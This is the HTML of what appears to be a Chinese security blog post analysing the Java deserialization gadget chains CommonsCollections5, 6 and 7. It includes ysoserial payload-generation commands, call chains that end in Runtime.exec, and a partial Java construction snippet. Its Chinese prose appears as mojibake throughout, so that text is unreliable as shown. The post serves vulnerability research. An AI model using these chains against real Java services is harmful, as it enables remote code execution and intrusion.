<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections5,6,7,9,10 | 0kami&#39;s Blog</title>
  <meta name="description" content="A Web ğŸ¶ &amp;&amp; Code Reviewer">
  <meta name="keywords" content>
  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link rel="shortcut icon" href="/images/avatar.jpg">
  <link rel="alternate" href="/atom.xml" title="0kami's Blog">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="0x00 å‰è¨€æœ¬æ–‡ç»§ç»­åˆ†æCommonsCollectionsçš„ç›¸å…³ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿™æ¬¡ä¸»è¦åˆ†æCommonsCollections5,6,7ï¼Œä»¥åŠæˆ‘æ‰¾çš„ä¸€ä¸ªæ–°åˆ©ç”¨é“¾ï¼Œè¿™é‡Œæš‚ä¸”å°†å…¶ç§°ä¸º10.">
<meta name="keywords" content="vul">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections5,6,7,9,10">
<meta property="og:url" content="http://blog.0kami.cn/2019/10/31/java/study-java-deserialized-commonscollections3-others/index.html">
<meta property="og:site_name" content="0kami&#39;s Blog">
<meta property="og:description" content="0x00 å‰è¨€æœ¬æ–‡ç»§ç»­åˆ†æCommonsCollectionsçš„ç›¸å…³ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿™æ¬¡ä¸»è¦åˆ†æCommonsCollections5,6,7ï¼Œä»¥åŠæˆ‘æ‰¾çš„ä¸€ä¸ªæ–°åˆ©ç”¨é“¾ï¼Œè¿™é‡Œæš‚ä¸”å°†å…¶ç§°ä¸º10.">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029103316582.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029103756251.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029110642707.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029110812953.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029111315584.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029145451405.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029150815776.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029170332420.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029170517723.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029173505843.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029173654711.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191031172937969.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191031181203017.png">
<meta property="og:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191031183753047.png">
<meta property="og:updated_time" content="2020-11-18T14:30:35.931Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections5,6,7,9,10">
<meta name="twitter:description" content="0x00 å‰è¨€æœ¬æ–‡ç»§ç»­åˆ†æCommonsCollectionsçš„ç›¸å…³ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿™æ¬¡ä¸»è¦åˆ†æCommonsCollections5,6,7ï¼Œä»¥åŠæˆ‘æ‰¾çš„ä¸€ä¸ªæ–°åˆ©ç”¨é“¾ï¼Œè¿™é‡Œæš‚ä¸”å°†å…¶ç§°ä¸º10.">
<meta name="twitter:image" content="http://blog.0kami.cn/images/java-deserialized-commonscollections-others-20191031/image-20191029103316582.png">

  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
  <link href="//cdn.bootcss.com/node-waves/0.7.5/waves.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/style.css">
  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>
</head>
</html>
<body>
  <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>


  <script>setLoadingBarProgress(20)</script> 
  <header class="l_header">
	<div class='wrapper'>
		<div class="nav-main container container--flex">
			<a class="logo flat-box" href='/' >
				0kami's Blog
			</a>
			<div class='menu'>
				<ul class='h-list'>
					
						<li>
							<a class='flat-box nav-home' href='/'>
								Home
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-archives' href='/archives'>
								Archives
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-about' href='/about'>
								About
							</a>
						</li>
					
				</ul>
				<div class='underline'></div>
			</div>
			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="Search" />
						<span class="icon icon-search"></span>
					</form>
				</div>
			
			<ul class='switcher h-list'>
				
					<li class='s-search'><a href='javascript:void(0)'><span class="icon icon-search flat-box"></span></a></li>
				
				<li class='s-menu'><a href='javascript:void(0)'><span class="icon icon-menu flat-box"></span></a></li>
			</ul>
		</div>
		
		<div class='nav-sub container container--flex'>
			<a class="logo" class="flat-box" href='javascript:void(0)'>
				Word of Forks
			</a>

			<ul class='switcher h-list'>
				<li class='s-comment'><a href='javascript:void(0)'><span class="icon icon-chat_bubble_outline flat-box"></span></a></li>
				<li class='s-top'><a href='javascript:void(0)'><span class="icon icon-arrow_upward flat-box"></span></a></li>
				<li class='s-toc'><a href='javascript:void(0)'><span class="icon icon-format_list_numbered flat-box"></span></a></li>
			</ul>
		</div>
	</div>
</header>
<aside class="menu-phone">
	<nav>
		
			<a href="/" class="nav-home nav">
				Home
			</a>
		
			<a href="/archives" class="nav-archives nav">
				Archives
			</a>
		
			<a href="/about" class="nav-about nav">
				About
			</a>
		
	</nav>
</aside>

    <script>setLoadingBarProgress(40);</script>
  <div class="l_body">
    <div class='container clearfix'>
      <div class='l_main'>
        <article id="post-java/study-java-deserialized-commonscollections3-others"
  class="post white-box article-type-post"
  itemscope itemprop="blogPost">
	<section class='meta'>
	<h2 class="title">
  	<a href="/2019/10/31/java/study-java-deserialized-commonscollections3-others/">
    	ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections5,6,7,9,10
    </a>
  </h2>
	<time>
	  Oct 31, 2019
	</time>
	
    
    <div class='cats'>
        <a href="/categories/notes/">notes</a>
    </div>

	</section>
	
		<section class="toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-å‰è¨€"><span class="toc-number">1.</span> <span class="toc-text">0x00 å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-ç¯å¢ƒå‡†å¤‡"><span class="toc-number">2.</span> <span class="toc-text">0x01 ç¯å¢ƒå‡†å¤‡</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-åˆ©ç”¨é“¾åˆ†æ"><span class="toc-number">3.</span> <span class="toc-text">0x02 åˆ©ç”¨é“¾åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-èƒŒæ™¯å›é¡¾"><span class="toc-number">3.1.</span> <span class="toc-text">1. èƒŒæ™¯å›é¡¾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections5"><span class="toc-number">3.2.</span> <span class="toc-text">2. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections6"><span class="toc-number">3.3.</span> <span class="toc-text">3. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections7"><span class="toc-number">3.4.</span> <span class="toc-text">4. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-åˆ©ç”¨é“¾æ„é€ "><span class="toc-number">3.5.</span> <span class="toc-text">5. åˆ©ç”¨é“¾æ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections6"><span class="toc-number">3.5.1.</span> <span class="toc-text">CommonsCollections6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections7"><span class="toc-number">3.5.2.</span> <span class="toc-text">CommonsCollections7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-æ„é€ æ–°CommonsCollections10"><span class="toc-number">3.6.</span> <span class="toc-text">6. æ„é€ æ–°CommonsCollections10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-æ¢…å­é…’å¸ˆå‚…çš„CommonsCollections9"><span class="toc-number">3.7.</span> <span class="toc-text">7. æ¢…å­é…’å¸ˆå‚…çš„CommonsCollections9</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-æ€»ç»“"><span class="toc-number">4.</span> <span class="toc-text">0x03 æ€»ç»“</span></a></li></ol></section>
	
	<section class="article typo">
  	<div class="article-entry" itemprop="articleBody">
    	<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>æœ¬æ–‡ç»§ç»­åˆ†æCommonsCollectionsçš„ç›¸å…³ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿™æ¬¡ä¸»è¦åˆ†æCommonsCollections5,6,7ï¼Œä»¥åŠæˆ‘æ‰¾çš„ä¸€ä¸ªæ–°åˆ©ç”¨é“¾ï¼Œè¿™é‡Œæš‚ä¸”å°†å…¶ç§°ä¸º10.</p>
<a id="more"></a>
<h1 id="0x01-ç¯å¢ƒå‡†å¤‡"><a href="#0x01-ç¯å¢ƒå‡†å¤‡" class="headerlink" title="0x01 ç¯å¢ƒå‡†å¤‡"></a>0x01 ç¯å¢ƒå‡†å¤‡</h1><hr>
<p>jdk8ï¼Œcommons-collections:3.1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections5.ser</span><br><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections6.ser</span><br><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections7.ser</span><br></pre></td></tr></table></figure>
<h1 id="0x02-åˆ©ç”¨é“¾åˆ†æ"><a href="#0x02-åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="0x02 åˆ©ç”¨é“¾åˆ†æ"></a>0x02 åˆ©ç”¨é“¾åˆ†æ</h1><hr>
<h2 id="1-èƒŒæ™¯å›é¡¾"><a href="#1-èƒŒæ™¯å›é¡¾" class="headerlink" title="1. èƒŒæ™¯å›é¡¾"></a>1. èƒŒæ™¯å›é¡¾</h2><p>å‰é¢æåˆ°è¿‡CommonsCollections1å’Œ3åœ¨æ„é€ AnnotationInvocationHandleræ—¶ç”¨åˆ°äº†Override.classã€‚ä½†æ˜¯å¦‚æœä½ åœ¨jdk8çš„ç¯å¢ƒä¸‹å»è½½å…¥ç”Ÿæˆçš„payloadï¼Œä¼šå‘ç”Ÿ<code>java.lang.Override missing element entrySet</code>çš„é”™è¯¯ã€‚</p>
<p>è¿™ä¸ªé”™è¯¯çš„äº§ç”ŸåŸå› ä¸»è¦åœ¨äºjdk8æ›´æ–°äº†<code>AnnotationInvocationHandler</code><a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java" target="_blank" rel="noopener">å‚è€ƒ</a></p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029103316582.png" alt="image-20191029103316582"></p>
<p>jdk8ä¸ç›´æ¥è°ƒç”¨<code>s.defaultReadObject</code>æ¥å¡«å……å½“å‰çš„<code>AnnotaionInvocationHandler</code>å®ä¾‹ï¼Œè€Œé€‰æ‹©äº†å•ç‹¬å¡«å……æ–°çš„å˜é‡ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬å›é¡¾ä¸€ä¸‹ï¼Œ1å’Œ3çš„payloadçš„è§¦å‘ç‚¹æ˜¯<code>LazyMap.get</code>å‡½æ•°ï¼Œè€Œè§¦å‘è¿™ä¸ªå‡½æ•°éœ€è¦ä½¿å¾—<code>memberValues</code>ä¸º<code>LazyMap</code>å¯¹è±¡</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029103756251.png" alt="image-20191029103756251"></p>
<p>æ˜¾ç„¶ï¼Œjdk8çš„æ“ä½œä½¿å¾—<code>memberValues</code>å¹¶ä¸æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„<code>LazyMap</code>ç±»å‹ã€‚åœ¨è°ƒè¯•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„<code>memberValues</code>ä¸º<code>LinkedHashMap</code>å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ— æ³•è·å¾—<code>entrySet</code>çš„å†…å®¹ï¼Œæ‰€ä»¥ä¼šæŠ¥å‰é¢çš„è¿™ä¸ªé”™è¯¯ã€‚</p>
<p>jdk8ä¸‹CommonsCollections1å’Œ3æ— æ³•æˆåŠŸåˆ©ç”¨äº†ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ›¿ä»£AnnotationInvocationHandlerçš„åˆ©ç”¨æ–¹å¼å‘¢ï¼Ÿè¿™å°±æ˜¯æœ¬æ–‡è¦è®²çš„CommonsCollections5ï¼Œ6ï¼Œ7æ‰€åšå‡ºçš„æ”¹å˜ã€‚</p>
<h2 id="2-é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections5"><a href="#2-é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections5" class="headerlink" title="2. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections5"></a>2. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections5</h2><p>CommonsCollections5ä¸1çš„åŒºåˆ«åœ¨äºAnnotationInvocationHandlerï¼Œåéƒ¨åˆ†æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸åˆ†æåéƒ¨åˆ†ã€‚</p>
<p>AnnotationInvocationHandleråœ¨å‰é¢èµ·åˆ°çš„ä½œç”¨æ˜¯æ¥è§¦å‘LazyMap.getå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯è¦é‡æ–°æ‰¾ä¸€ä¸ªå¯ä»¥è§¦å‘è¯¥å‡½æ•°çš„å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡æ»¡è¶³</p>
<ul>
<li>ç±»å¯åºåˆ—åŒ–ï¼Œç±»å±æ€§æœ‰ä¸ªå¯æ§çš„Mapå¯¹è±¡æˆ–Object</li>
<li>è¯¥ç±»çš„ç±»å‡½æ•°ä¸Šæœ‰è°ƒç”¨è¿™ä¸ªMap.getçš„åœ°æ–¹</li>
</ul>
<p>CommonsCollections5åœ¨è¿™é‡Œç”¨åˆ°äº†TiedMapEntryï¼Œæ¥çœ‹ä¸€ä¸‹</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029110642707.png" alt="image-20191029110642707"></p>
<p>TiedMapEntryæœ‰ä¸€ä¸ªmapç±»å±æ€§ï¼Œä¸”åœ¨getValueå¤„è°ƒç”¨äº†map.getå‡½æ•°ã€‚åŒæ—¶toStringã€hashCodeã€equalså‡è°ƒç”¨äº†getValueå‡½æ•°ï¼Œè¿™é‡Œå…³æ³¨toStringå‡½æ•°ã€‚</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029110812953.png" alt="image-20191029110812953"></p>
<p>toStringå‡½æ•°é€šå¸¸åœ¨ä¸å­—ç¬¦ä¸²æ‹¼æ¥æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå¯¹è±¡æ»¡è¶³</p>
<ul>
<li>ç±»å¯åºåˆ—åŒ–ï¼Œç±»å±æ€§æœ‰ä¸ªMap.Entryå¯¹è±¡æˆ–Object</li>
<li>è¯¥ç±»ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªç±»å±æ€§çš„toStringå‡½æ•°æˆ–å‰é¢çš„å¦å¤–å‡ ç§</li>
</ul>
<p>è¿™é‡Œé€‰æ‹©äº†<code>BadAttributeValueExpException</code>å¯¹è±¡ï¼Œä»–çš„<code>readObject</code>å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨ç±»å±æ€§çš„<code>toString</code>å‡½æ•°ã€‚</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029111315584.png" alt="image-20191029111315584"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œ<code>System.getSecurityManager</code>ä¸ºç©ºï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯å½“å‰çš„jvmç¯å¢ƒä¸èƒ½å¯ç”¨å®‰å…¨ç®¡ç†å™¨ã€‚</p>
<p>æ¥çœ‹ä¸€ä¸‹ä¸€æ•´ä¸ªè°ƒç”¨é“¾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">	-&gt; valObj.toString() =&gt; TiedMapEntry.getValue</span><br><span class="line">	-&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()</span><br><span class="line">	-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">	-&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure>
<h2 id="3-é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections6"><a href="#3-é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections6" class="headerlink" title="3. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections6"></a>3. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections6</h2><p>CommonsCollections6æ˜¯å¦ä¸€ç§æ›¿æ¢æ–¹å¼ï¼ŒååŠéƒ¨åˆ†çš„åˆ©ç”¨é“¾è¿˜æ˜¯æ²¡æœ‰å˜ï¼Œä¸ä½œåˆ†æã€‚</p>
<p>æˆ‘ä»¬åœ¨2ä¸­æåˆ°äº†é™¤äº†CommonsCollections5ç”¨çš„<code>toString</code>å¤–ï¼Œè¿˜æœ‰<code>hashCode</code>å’Œ<code>equals</code>å‡½æ•°ä¹Ÿè°ƒç”¨äº†getValueå‡½æ•°ã€‚é‚£ä¹ˆæ˜¯å¦å­˜åœ¨è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„å¯¹è±¡å‡½æ•°å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼</p>
<p>CommonsCollections6åˆ©ç”¨äº†<code>TiedMapEntry</code>çš„<code>hashCode</code>å‡½æ•°ï¼Œæ¥è§¦å‘<code>LazyMap.get</code></p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“HashSeté›†åˆé‡Œä¸ä¼šå­˜åœ¨ç›¸åŒçš„keyï¼Œé‚£ä¹ˆæ˜¯å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ˜¯ç›¸åŒçš„keyå‘¢ï¼Ÿè¿™é‡Œå°±è¦ç”¨åˆ°keyçš„hashCodeå‡½æ•°äº†ï¼Œå¦‚æœkeyçš„å€¼ç›¸åŒï¼Œå…¶hashCodeè¿”å›çš„å€¼ä¹Ÿæ˜¯ç›¸åŒçš„ã€‚è¿™é‡Œçš„HashCodeçš„è®¡ç®—åœ¨HashSetçš„putå’Œaddå‡½æ•°å®Œæˆï¼Œå¹¶ä¸”HashSetä»åºåˆ—åŒ–æ•°æ®ä¸­è¿˜åŸå‡ºæ¥æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨putå‡½æ•°ï¼Œè¿™é‡Œå°±ç»™æˆ‘ä»¬æä¾›äº†å¯æ§çš„åœ°æ–¹ã€‚</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹HashSetçš„<code>readObject</code>å‡½æ•°</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029145451405.png" alt="image-20191029145451405"></p>
<p>ç»§ç»­è·Ÿputå‡½æ•°ï¼Œè¿™é‡Œå…¶å®è°ƒç”¨çš„æ˜¯HashMapçš„putå‡½æ•°</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029150815776.png" alt="image-20191029150815776"></p>
<p>å…¶ä¸­å¯¹keyè°ƒç”¨çš„<code>hash()</code>å‡½æ•°ä¼šè°ƒç”¨<code>key.hashCode</code>å‡½æ•°ï¼Œé‚£ä¹ˆç°åœ¨å°±å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä»¬åªè¦å°†keyçš„å€¼æ›¿æ¢æˆæ„é€ å¥½çš„<code>TiedMapEntry</code>å¯¹è±¡å°±å¯ä»¥äº†ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„keyå€¼å…¶å®å°±æ˜¯<code>HashSet.add</code>çš„å®ä¾‹ï¼Œåœ¨HashSeté‡Œçš„HashMapç±»å±æ€§åªç”¨åˆ°äº†Keyã€‚</p>
<p>æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">	-&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode</span><br><span class="line">	-&gt; TiedMapEntry.getValue</span><br><span class="line">	-&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()</span><br><span class="line">	-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">	-&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure>
<h2 id="4-é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections7"><a href="#4-é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections7" class="headerlink" title="4. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections7"></a>4. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections7</h2><p>CommonsCollections7ç”¨äº†Hashtableæ¥ä»£æ›¿<code>AnnotationInvocationHandler</code>ï¼Œä¸åŒäºå‰é¢ä¸¤ç§CommonsCollections7å¹¶æœªä½¿ç”¨<code>TiredMapEntry</code>ï¼Œè€Œæ˜¯ç”¨äº†ç›¸åŒkeyå†²çªçš„æ–¹å¼è°ƒç”¨<code>equals</code>æ¥è§¦å‘<code>Lazy.get</code>å‡½æ•°ã€‚</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹<code>Hashtable</code>çš„<code>readObject</code>å‡½æ•°</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029170332420.png" alt="image-20191029170332420"></p>
<p>ç»§ç»­è·Ÿè¿›<code>reconstitutionPut</code></p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029170517723.png" alt="image-20191029170517723"></p>
<p>è¯¥å‡½æ•°å°†å¡«å……tableçš„å†…å®¹ï¼Œå…¶ä¸­ç¬¬1236è¡Œä»…å½“æœ‰é‡å¤æ•°æ®å†²çªæ—¶ï¼Œæ‰ä¼šè¿›å…¥ä¸‹é¢çš„ifè¯­å¥ï¼Œè¿™é‡Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›<code>equals</code>å‡½æ•°</p>
<p>è¿™é‡Œçš„<code>equals</code>å‡½æ•°å–å†³äº<code>key</code>çš„å¯¹è±¡ï¼Œåˆ©ç”¨é“¾ç”¨çš„æ˜¯<code>LazyMap</code>å¯¹è±¡ï¼Œå®é™…è°ƒç”¨çš„æ˜¯çˆ¶ç±»<code>AbstractMapDecorator</code>çš„<code>equals</code>å‡½æ•°</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029173505843.png" alt="image-20191029173505843"></p>
<p>è¿™é‡Œåˆè°ƒç”¨äº†mapçš„equalså‡½æ•°ï¼Œè¿™é‡Œå®é™…è°ƒç”¨çš„æ˜¯HashMapçš„çˆ¶ç±»<code>AbstractMap</code>çš„<code>equals</code>å‡½æ•°</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029173654711.png" alt="image-20191029173654711"></p>
<p>åœ¨ç¬¬495è¡Œè°ƒç”¨äº†<code>m.get</code>å‡½æ•°ï¼Œæ‰€ä»¥åé¢åˆæ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„<code>LazyMap.get</code>çš„å¥—è·¯äº†ã€‚</p>
<p>æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">	-&gt; Hashtable.reconstitutionPut</span><br><span class="line">	-&gt; LazyMap.equals =&gt; AbstractMapDecorator.equals =&gt; AbstractMap.equals</span><br><span class="line">	-&gt; m.get() =&gt; LazyMap.get()</span><br><span class="line">	-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">	-&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure>
<h2 id="5-åˆ©ç”¨é“¾æ„é€ "><a href="#5-åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="5. åˆ©ç”¨é“¾æ„é€ "></a>5. åˆ©ç”¨é“¾æ„é€ </h2><p>CommonsCollections6å’Œ7çš„expæ„é€ æ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œå•ç‹¬æ‹¿å‡ºæ¥è®²ä¸€ä¸‹ã€‚</p>
<hr>
<h3 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h3><p>ç»è¿‡å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“CommonsCollections6éœ€è¦å°†æ„é€ å¥½çš„TiedMapEntryå®ä¾‹æ·»åŠ åˆ°HashSetçš„å€¼ä¸Šã€‚</p>
<p>ç®€å•çš„æ–¹æ³•å°±æ˜¯ç›´æ¥add</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(entry);</span><br></pre></td></tr></table></figure>
<p>å¤æ‚ä¸€ç‚¹ï¼Œå°±æ˜¯ysoserailé‡Œçš„å®ç°æ–¹æ³•ï¼Œé‡‡ç”¨åå°„æœºåˆ¶æ¥å®Œæˆ</p>
<p>å…¶æ€è·¯ä¸»è¦ä¸ºï¼š</p>
<ul>
<li>å®ä¾‹åŒ–ä¸€ä¸ªHashSetå®ä¾‹</li>
